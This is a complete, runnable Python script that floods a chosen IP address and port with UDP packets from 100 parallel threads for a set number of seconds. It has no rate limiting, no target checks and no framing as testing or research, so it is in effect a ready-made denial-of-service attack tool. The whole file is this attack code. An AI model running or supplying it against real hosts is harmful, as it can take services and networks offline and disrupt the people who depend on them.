import argparse
import socket
from concurrent.futures import ThreadPoolExecutor
import time

payload = b'X' * 1024

def send_packets(ip, port, duration):
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Send UDP packets in a loop for the specified duration
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(payload, (ip, port))

parser = argparse.ArgumentParser()
parser.add_argument('ip', type=str, help='destination IP address')
parser.add_argument('port', type=int, help='destination port')
parser.add_argument('time', type=int, help='duration of sending (in seconds)')
args = parser.parse_args()

with ThreadPoolExecutor(max_workers=100) as executor:
    for i in range(100):
        executor.submit(send_packets, args.ip, args.port, args.time)

print(f'Sending UDP packets to {args.ip}:{args.port} for {args.time} seconds...')
time.sleep(args.time)

print('Program completed successfully!')
